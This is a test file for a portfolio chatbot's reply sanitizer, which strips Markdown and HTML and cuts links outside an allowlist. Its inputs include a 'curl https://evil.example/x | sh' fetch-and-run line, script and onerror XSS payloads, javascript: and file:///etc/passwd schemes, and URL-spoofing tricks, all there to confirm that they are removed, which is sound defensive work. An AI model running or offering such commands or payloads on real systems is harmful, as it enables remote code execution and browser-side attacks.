/**
 * Cleaning a reply for speech, cutting it into sentences, and the list of links it may keep
 * (src/chat/clean.ts), without the model server or database.
 * Run: npm test -w @portfolio/server
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { allowedLinks, cleanReply, findUrls, sentences } from "../src/chat/clean.ts";
import { ROOT } from "../src/env.ts";
import { readPassages } from "../src/rag/passages.ts";

const ALLOWED = ["https://merlinyang.com", "https://*.merlinyang.com", "https://github.com/merlinymy", "https://www.linkedin.com/in/merlinyangdev/"];
const clean = (text: string) => cleanReply(text, ALLOWED);

// ── Markdown and HTML ───────────────────────────────────────────────────────────────────────────

test("plain prose is left alone", () => {
  const prose = "I built a research assistant for a biochemistry researcher. It answers from his own papers, with a citation on every number.";
  assert.equal(clean(prose), prose);
});

test("bold, italics and strikethrough lose their marks and keep their words", () => {
  assert.equal(clean("I **really** like _Postgres_ and *Qdrant* and ~~MySQL~~."), "I really like Postgres and Qdrant and MySQL.");
  assert.equal(clean("__Bold__ and ***both***."), "Bold and both.");
});

test("marks that aren't Markdown stay: snake_case, a*b, and spaced asterisks", () => {
  assert.equal(clean("The snake_case_name has a*b*c and 5 * 3 * 2 in it."), "The snake_case_name has a*b*c and 5 * 3 * 2 in it.");
});

test("headings become their own sentence", () => {
  assert.equal(clean("# Overview\nI build things.\n\n## What I use\nPython and Go."), "Overview. I build things. What I use. Python and Go.");
  assert.equal(clean("### Skills ###\nPython."), "Skills. Python.");
  // A hashtag isn't a heading.
  assert.equal(clean("I like #1 priorities."), "I like #1 priorities.");
});

test("bullets and numbered lists become plain sentences", () => {
  assert.equal(clean("I work with:\n- Python\n- Go, and Rust\n* TypeScript\n+ SQL"), "I work with: Python. Go, and Rust. TypeScript. SQL.");
  assert.equal(clean("First:\n1. Read the passages\n2) Write the answer\n10. Check it."), "First: Read the passages. Write the answer. Check it.");
});

test("a list item that already ends a sentence isn't given a second full stop", () => {
  assert.equal(clean("- It works!\n- Does it scale?"), "It works! Does it scale?");
});

test("a number at the start of a line isn't mistaken for a list", () => {
  assert.equal(clean("3.8 is my GPA.\n2025. A good year."), "3.8 is my GPA. 2025. A good year.");
});

test("code fences and backticks go, the words inside stay", () => {
  assert.equal(clean("Run `npm test` first."), "Run npm test first.");
  assert.equal(clean("Like this:\n```ts\nconst x = 1;\n```\nThen stop."), "Like this: const x = 1; Then stop.");
  assert.equal(clean("An unfinished fence:\n```\ncode here"), "An unfinished fence: code here");
  // What's inside backticks isn't Markdown, even when it looks like it.
  assert.equal(clean("Python's `__init__` and `*args`."), "Python's __init__ and *args.");
});

test("horizontal rules, quotes and tables read as sentences", () => {
  assert.equal(clean("Before\n---\nAfter"), "Before After");
  assert.equal(clean("> A quoted line\n> and another"), "A quoted line and another");
  assert.equal(clean("| Tool | Use |\n|---|---|\n| Qdrant | search |"), "Tool, Use. Qdrant, search.");
});

test("images keep only their description", () => {
  assert.equal(clean("Here: ![the diagram](https://evil.com/p.png) ok"), "Here: the diagram ok");
});

test("HTML tags go, and so do script blocks and comments", () => {
  assert.equal(clean("<b>bold</b> and <i>italic</i>, <a href='https://evil.com'>a link</a>."), "bold and italic, a link.");
  assert.equal(clean("<p>One</p><p>Two</p>"), "One Two");
  assert.equal(clean("line<br>break<br/>here"), "line break here");
  assert.equal(clean("Hi<script>alert(1)</script> there<!-- hidden -->"), "Hi there");
  assert.equal(clean("<img src=x onerror=alert(1)>Hello"), "Hello");
  assert.equal(clean("<div class=\"x\">Text</div>"), "Text");
});

test("a few HTML entities are read as the characters they stand for", () => {
  assert.equal(clean("Q&amp;A &lt;3 &quot;quoted&quot; it&#39;s"), 'Q&A <3 "quoted" it\'s');
});

test("whitespace is collapsed to single spaces", () => {
  assert.equal(clean("  one\n\n\ntwo \t three   "), "one two three");
  assert.equal(clean(""), "");
  assert.equal(clean("   \n  "), "");
});

test("Windows line endings don't leak through", () => {
  assert.equal(clean("a\r\nb"), "a b");
});

// ── Things that look like nothing but aren't ────────────────────────────────────────────────────

test("a reply can't forge the markers the cleaner works with", () => {
  // The cleaner sets code aside as "private-use character, number, private-use character".
  assert.equal(clean("a\u{e000}0\u{e001}b"), "a0b");
  // Written as an entity, the same characters used to survive decoding and come out as "undefined".
  assert.equal(clean("&#xE000;1&#xE001;"), "1");
  assert.equal(clean("x &#57344;0&#57345; y `real code` z"), "x 0 y real code z");
  assert.equal(clean("&#xe000;99&#xe001; and &#xE000;0&#xE001;"), "99 and 0");
  for (const attack of ["&#xE000;1&#xE001;", "&#xE000;&#xE001;", "&#xE000;7&#xE001; `code`", "```\ncode\n```\n&#xE000;5&#xE001;"]) {
    const out = clean(attack);
    assert.ok(!out.includes("undefined"), `${JSON.stringify(attack)} gave ${JSON.stringify(out)}`);
    assert.ok(!/[\u{e000}-\u{f8ff}]/u.test(out));
  }
});

test("control characters, zero-width characters and text-direction tricks are removed", () => {
  assert.equal(clean("a\u{200b}b\u{feff}c\u{ad}d"), "abcd");
  assert.equal(clean("a&#x1b;b&#x7;c&#x202e;d"), "abcd");
  // Without the override characters, "moc.live" is just a domain.
  assert.equal(clean("a \u{202e}moc.live\u{202c}"), "a");
  assert.equal(clean("tab\tand\nnewline"), "tab and newline");
});

test("look-alike and full-width letters can't hide a link", () => {
  assert.equal(clean("See ｅｖｉｌ．ｃｏｍ/login"), "See");
  assert.equal(clean("See ｈｔｔｐｓ：／／ｅｖｉｌ．ｃｏｍ／ｘ"), "See");
  assert.equal(clean("See ev\u{200b}il.com/login"), "See");
  // And an allowed one still reads as itself.
  assert.equal(clean("See ｍｅｒｌｉｎｙａｎｇ．ｃｏｍ"), "See merlinyang.com");
});

test("a link written in pieces and put together by stripping Markdown is still found", () => {
  assert.equal(clean("See evil**.**com/login now"), "See now");
  assert.equal(clean("See https://ev**il**.com/x now"), "See now");
  assert.equal(clean("See evil<b>.</b>com/login now"), "See now");
});

// ── Links ───────────────────────────────────────────────────────────────────────────────────────

test("a Markdown link keeps its words, and its address only if it's yours", () => {
  assert.equal(clean("See [my GitHub](https://github.com/merlinymy) now."), "See my GitHub (https://github.com/merlinymy) now.");
  assert.equal(clean("See [this page](https://evil.com/x) now."), "See this page now.");
  assert.equal(clean("Write to [me](mailto:someone@example.com)."), "Write to me.");
  assert.equal(clean("Click [here](javascript:alert(1))."), "Click here.");
});

test("a link whose words are already its address isn't said twice", () => {
  assert.equal(clean("[merlinyang.com](https://merlinyang.com)"), "merlinyang.com");
  assert.equal(clean("[https://github.com/merlinymy](https://github.com/merlinymy)"), "https://github.com/merlinymy");
});

test("an address from your own sites stays, others are cut", () => {
  assert.equal(clean("See https://merlinyang.com/about for more."), "See https://merlinyang.com/about for more.");
  assert.equal(clean("Try https://evil.com/offer, it's free."), "Try, it's free.");
  assert.equal(clean("Also www.evil.org."), "Also.");
  assert.equal(clean("Go to evil.com/promo today."), "Go to today.");
});

test("subdomains of your site stay, and look-alikes don't", () => {
  assert.equal(clean("https://tcgmemoryleague.merlinyang.com/"), "https://tcgmemoryleague.merlinyang.com/");
  assert.equal(clean("a.b.merlinyang.com/x"), "a.b.merlinyang.com/x");
  assert.equal(clean("See https://merlinyang.com.evil.com/x"), "See");
  assert.equal(clean("See https://evilmerlinyang.com/x"), "See");
  assert.equal(clean("See https://merlinyang.co/x"), "See");
});

test("paths match on whole parts: your GitHub page stays, someone else's doesn't", () => {
  assert.equal(clean("github.com/merlinymy"), "github.com/merlinymy");
  assert.equal(clean("https://github.com/merlinymy/arc-repo?tab=readme#top"), "https://github.com/merlinymy/arc-repo?tab=readme#top");
  assert.equal(clean("See https://github.com/merlinymy-evil/x"), "See");
  assert.equal(clean("See https://github.com/torvalds/linux"), "See");
  assert.equal(clean("See https://github.com/merlinymyx"), "See");
});

test("tricks that make a link look like yours are caught", () => {
  assert.equal(clean("See https://merlinyang.com@evil.com/ ok"), "See ok");
  assert.equal(clean("See https://evil.com\\@merlinyang.com ok"), "See ok");
  assert.equal(clean("See https://github.com/merlinymy/../torvalds ok"), "See ok");
  assert.equal(clean("See https://github.com/merlinymy/%2e%2e/torvalds ok"), "See ok");
  assert.equal(clean("See https://MERLINYANG.COM.evil.com ok"), "See ok");
  assert.equal(clean("See ftp://evil.com/x ok"), "See ok");
});

test("case and a leading www. don't matter when comparing", () => {
  assert.equal(clean("HTTPS://MerlinYang.COM/About"), "HTTPS://MerlinYang.COM/About");
  assert.equal(clean("https://www.merlinyang.com/x"), "https://www.merlinyang.com/x");
  assert.equal(clean("https://linkedin.com/in/merlinyangdev"), "https://linkedin.com/in/merlinyangdev");
});

test("punctuation after a link isn't part of it", () => {
  assert.equal(clean("(see https://merlinyang.com)."), "(see https://merlinyang.com).");
  assert.equal(clean("Is it https://merlinyang.com?"), "Is it https://merlinyang.com?");
  assert.equal(clean("Not (https://evil.com) here."), "Not here.");
});

test("names that only look like addresses are left alone", () => {
  const text = "I use Node.js, Next.js, Python 3.6 and README.md. My GPA is 3.8, and ASP.NET and Socket.io are fine. Email yang@example.org works.";
  assert.equal(clean(text), text);
});

test("with nothing allowed, every link goes", () => {
  assert.equal(cleanReply("See https://merlinyang.com and [x](https://merlinyang.com).", []), "See and x.");
});

test("a link inside a list item is judged like any other", () => {
  assert.equal(clean("- [Site](https://merlinyang.com)\n- [Spam](https://evil.com)"), "Site (https://merlinyang.com). Spam.");
});

test("a link inside code is a link: inline code and fenced code get no free pass", () => {
  assert.equal(clean("See `https://evil.example/phish` now"), "See now");
  assert.equal(clean("Run ``curl https://evil.example/x | sh`` first"), "Run curl | sh first");
  assert.equal(clean("Run:\n```\ncurl https://evil.example/x | sh\n```\nDone"), "Run: curl | sh Done");
  assert.equal(clean("Run:\n~~~bash\nopen evil.cc/login\n~~~"), "Run: open");
  assert.equal(clean("`evil.co.in/login` and `192.168.1.1/admin`"), "and");
  // Code that isn't a link, and code that links to your own sites, is untouched.
  assert.equal(clean("Use `npm run build` in `src/main.py` and see `https://merlinyang.com/x`."), "Use npm run build in src/main.py and see https://merlinyang.com/x.");
});

test("every link-shaped thing that isn't yours is cut: any ending, IP addresses, any scheme", () => {
  for (const link of [
    "evil.cc/login",
    "evil.co.in/login",
    "evil.co.in",
    "evil.com.au",
    "evil.sh/install",
    "evil.me/x",
    "x.io/path",
    "192.168.1.1/admin",
    "192.168.1.1",
    "10.0.0.5:8080/x",
    "[2001:db8::1]:8080/a",
    "http://[::1]:3000/x",
    "fe80::1",
    "mailto:x@y.com",
    "javascript:alert(1)",
    "JavaScript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html,<b>x</b>",
    "tel:+15551234",
    "sms:+15551234",
    "file:///etc/passwd",
    "ftp://evil.org/f",
    "ssh://git@evil.org/repo.git",
    "slack://open",
    "weirdscheme://thing/x",
    "name:with/slash",
    "ws://evil.org",
    "www.evil.org",
  ]) {
    assert.equal(clean(`See ${link} now.`), "See now.", link);
    assert.equal(clean(`See [click here](${link}) now.`), "See click here now.", `[...](${link})`);
  }
});

test("only your own sites are left of a pile of links", () => {
  assert.equal(
    clean("A merlinyang.com, B evil.cc/x, C https://github.com/merlinymy/arc, D 10.0.0.1, E mailto:a@b.co, F foo.merlinyang.com/z"),
    "A merlinyang.com, B, C https://github.com/merlinymy/arc, D, E, F foo.merlinyang.com/z",
  );
});

test("names that look like addresses are left alone", () => {
  const text =
    "Node.js, Next.js/React, TypeScript/Node.js, D3.js and Vue.js; ASP.NET, VB.NET, Socket.io and Claude.ai; README.md, main.py, install.sh, lib.rs; " +
    "an M.Sc. in CS and a B.Tech.; Dr.Smith said done.Today we go; std::vector and Add::add; **Note:** the ratio is 3:1 at 10:30:45, and Skills:Python,Go; Python 3.11.4 and 1.2.3.4.5.";
  assert.equal(clean(text), text.replace(/\*\*/g, ""));
});

test("an email address isn't a link and stays", () => {
  assert.equal(clean("Write to yang.mengy@northeastern.edu today."), "Write to yang.mengy@northeastern.edu today.");
  assert.equal(clean("Write to [me](mailto:yang.mengy@northeastern.edu) today."), "Write to me today.");
});

test("cleaning the profile's own passages changes nothing", async () => {
  const allowed = await allowedLinks(`${ROOT}content`);
  for (const p of await readPassages(`${ROOT}content`)) {
    assert.equal(cleanReply(p.body, allowed), p.body.replace(/\s+/g, " ").trim(), p.id);
  }
});

test("findUrls finds addresses with a scheme, www., or a web ending, with their position", () => {
  const text = "see https://a.com/x), (www.b.org/y). and bit.ly/abc, t.co/z. Node.js x.io/path foo@bar.com 3.8 e.g. i.e.";
  assert.deepEqual(
    findUrls(text).map((f) => f.url),
    ["https://a.com/x", "www.b.org/y", "bit.ly/abc", "t.co/z", "x.io/path"],
  );
  for (const f of findUrls(text)) assert.equal(text.slice(f.start, f.end), f.url);
});

// ── Sentences ───────────────────────────────────────────────────────────────────────────────────

test("sentences split after . ! ? and a space", () => {
  assert.deepEqual(sentences("I build tools. They work! Do you want to see one? Sure."), ["I build tools.", "They work!", "Do you want to see one?", "Sure."]);
});

test("one sentence stays one piece, with or without a final stop", () => {
  assert.deepEqual(sentences("Just one"), ["Just one"]);
  assert.deepEqual(sentences("Just one."), ["Just one."]);
  assert.deepEqual(sentences("  Padded.  "), ["Padded."]);
});

test("nothing in, nothing out", () => {
  assert.deepEqual(sentences(""), []);
  assert.deepEqual(sentences("   \n\n  "), []);
});

test("abbreviations don't end a sentence", () => {
  assert.deepEqual(sentences("Dr. Smith and Mr. Jones met Ms. Lee. Then they left."), ["Dr. Smith and Mr. Jones met Ms. Lee.", "Then they left."]);
  assert.deepEqual(sentences("Python vs. Flask is common, e.g. in APIs, i.e. small services. Fine."), [
    "Python vs. Flask is common, e.g. in APIs, i.e. small services.",
    "Fine.",
  ]);
  assert.deepEqual(sentences("We met at 9 a.m. Pacific and left at 5 p.m. Eastern. Good day."), ["We met at 9 a.m. Pacific and left at 5 p.m. Eastern.", "Good day."]);
  assert.deepEqual(sentences("I use Python, Go, etc. Then I rest."), ["I use Python, Go, etc. Then I rest."]);
  assert.deepEqual(sentences("I'm authorized in the U.S. Citizens apply. Next."), ["I'm authorized in the U.S. Citizens apply.", "Next."]);
  assert.deepEqual(sentences("Call 988 in the U.S., or visit findahelpline.com. Be well."), ["Call 988 in the U.S., or visit findahelpline.com.", "Be well."]);
  assert.deepEqual(sentences("I'm finishing an M.S. in Computer Science. Then I'm free."), ["I'm finishing an M.S. in Computer Science.", "Then I'm free."]);
  assert.deepEqual(sentences("Started in Jan. 2024. Ended later."), ["Started in Jan. 2024.", "Ended later."]);
});

test("decimals, versions and sizes don't end a sentence", () => {
  assert.deepEqual(sentences("My GPA is 3.8. I used Python 3.6 and a 0.6B model. It worked."), ["My GPA is 3.8.", "I used Python 3.6 and a 0.6B model.", "It worked."]);
  assert.deepEqual(sentences("OAuth 2.0 and GPT-4.1 are fine."), ["OAuth 2.0 and GPT-4.1 are fine."]);
});

test("names with a dot in them don't end a sentence", () => {
  assert.deepEqual(sentences("I use Node.js and Next.js. See merlinyang.com or findahelpline.com for more."), [
    "I use Node.js and Next.js.",
    "See merlinyang.com or findahelpline.com for more.",
  ]);
  assert.deepEqual(sentences("Open github.com/merlinymy/arc.py now."), ["Open github.com/merlinymy/arc.py now."]);
});

test("ellipses don't end a sentence", () => {
  assert.deepEqual(sentences("Well... I think so. Hmm… maybe not. Okay."), ["Well... I think so.", "Hmm… maybe not.", "Okay."]);
});

test("a closing quote or bracket stays with its sentence", () => {
  assert.deepEqual(sentences('He said "stop." Then he went. (It was late.) Fine.'), ['He said "stop."', "Then he went.", "(It was late.)", "Fine."]);
});

test("a paragraph break ends a sentence even without a full stop", () => {
  assert.deepEqual(sentences("A title\n\nThen the text. More text."), ["A title", "Then the text.", "More text."]);
});

test("the real distress reply splits where it should", () => {
  const reply =
    "I'm sorry you're going through this. I'm just an AI version of Merlin, but you don't have to face it alone. " +
    "In the U.S., you can call or text 988, the Suicide and Crisis Lifeline, any time. " +
    "Outside the U.S., findahelpline.com lists free helplines near you.";
  assert.equal(sentences(reply).length, 4);
});

test("no piece is over 600 characters, and nothing is lost", () => {
  const commas = `${"I worked on many different things, ".repeat(40)}and that's all.`;
  const pieces = sentences(commas);
  assert.ok(pieces.length >= 3);
  for (const p of pieces) assert.ok(p.length <= 600, `${p.length} characters`);
  assert.equal(pieces.join(" "), commas);

  const semicolons = Array.from({ length: 60 }, (_, i) => `part ${i} of the long list`).join("; ") + ".";
  for (const p of sentences(semicolons)) assert.ok(p.length <= 600);
  // It cuts at a semicolon when it can.
  assert.ok(sentences(semicolons)[0].endsWith(";"));

  const spaces = "word ".repeat(400).trim();
  for (const p of sentences(spaces)) assert.ok(p.length <= 600 && !p.startsWith(" ") && !p.endsWith(" "));
  assert.equal(sentences(spaces).join(" "), spaces);
});

test("a single unbroken string is cut at the limit rather than refused", () => {
  const pieces = sentences("x".repeat(1500));
  assert.deepEqual(pieces.map((p) => p.length), [600, 600, 300]);
});

test("sentences are never empty, even from messy input", () => {
  for (const text of ["...", "?!", ". . .", "Hello.   .   World.", "a\n\n\n\nb", "!!! Wow !!!", " . "]) {
    for (const s of sentences(text)) {
      assert.ok(s.trim().length > 0, `empty piece from ${JSON.stringify(text)}`);
      assert.equal(s, s.trim());
    }
  }
  // A piece with no words in it is voiced with the one before it, not on its own.
  assert.deepEqual(sentences("Really? ! Yes."), ["Really? !", "Yes."]);
  assert.deepEqual(sentences("Hello. ... World."), ["Hello.", "... World."]);
});

test("a cleaned reply goes straight into sentences", () => {
  const reply = "## About me\nI'm **Merlin**. I build:\n- AI tools\n- Data pipelines\n\nSee [my site](https://merlinyang.com).";
  assert.deepEqual(sentences(clean(reply)), ["About me.", "I'm Merlin.", "I build: AI tools.", "Data pipelines.", "See my site (https://merlinyang.com)."]);
});

// ── Your own links ──────────────────────────────────────────────────────────────────────────────

test("the real profile's links are all allowed, and so are your own sites", async () => {
  const allowed = await allowedLinks(`${ROOT}content`);
  assert.ok(allowed.includes("https://merlinyang.com"));
  assert.ok(allowed.includes("https://*.merlinyang.com"));
  assert.ok(allowed.some((u) => u.includes("linkedin.com/in/")), "LinkedIn");
  assert.ok(allowed.some((u) => u.startsWith("https://github.com/")), "GitHub");
  assert.equal(new Set(allowed).size, allowed.length, "no repeats");
  // Every address in every passage the chat can quote survives cleaning.
  let checked = 0;
  for (const p of await readPassages(`${ROOT}content`)) {
    for (const link of findUrls(p.body)) {
      checked++;
      assert.ok(cleanReply(p.body, allowed).includes(link.url.replace(/\/$/, "")), `${p.id}: ${link.url} was cut`);
    }
  }
  assert.ok(checked >= 3, `only ${checked} links found in the profile`);
  // And a stranger's still doesn't.
  assert.equal(cleanReply("See https://evil.com/x ok", allowed), "See ok");
});

test("allowed links come from the contact block, project links and earlier projects", async () => {
  const dir = await mkdtemp(join(tmpdir(), "chat-links-"));
  try {
    await mkdir(join(dir, "projects"));
    await writeFile(
      join(dir, "about.md"),
      "---\nname: Test Person\ncontact:\n  email: me@example.com\n  linkedin: https://www.linkedin.com/in/test-person/\n  github: https://github.com/test-person\n---\n\nBody.\n",
    );
    await writeFile(join(dir, "projects", "a.md"), "---\nname: A\nlinks:\n  - { label: Live, url: \"https://a.example.org/\" }\n  - { label: Code, url: \"https://github.com/test-person/a\" }\n---\n\n- Bullet.\n");
    await writeFile(join(dir, "projects", "b.md"), "---\nname: B\ntech: [Go]\n---\n\n- No links.\n");
    await writeFile(join(dir, "projects", "notes.txt"), "not a project");
    await writeFile(join(dir, "earlier-projects.yaml"), "- id: old\n  name: Old\n  links:\n    - { label: Live, url: \"https://old.example.net/app\" }\n- id: bare\n  name: Bare\n");
    assert.deepEqual(await allowedLinks(dir), [
      "https://www.linkedin.com/in/test-person/",
      "https://github.com/test-person",
      "https://a.example.org/",
      "https://github.com/test-person/a",
      "https://old.example.net/app",
      "https://merlinyang.com",
      "https://*.merlinyang.com",
    ]);
    // The email address isn't a link.
    assert.ok(!(await allowedLinks(dir)).some((u) => u.includes("example.com")));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("a profile with no projects or earlier projects still allows your own sites", async () => {
  const dir = await mkdtemp(join(tmpdir(), "chat-links-"));
  try {
    await writeFile(join(dir, "about.md"), "---\nname: Test Person\n---\n\nBody.\n");
    assert.deepEqual(await allowedLinks(dir), ["https://merlinyang.com", "https://*.merlinyang.com"]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("a content folder without about.md is an error, not an empty list", async () => {
  const dir = await mkdtemp(join(tmpdir(), "chat-links-"));
  try {
    await assert.rejects(allowedLinks(dir), /about\.md/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});
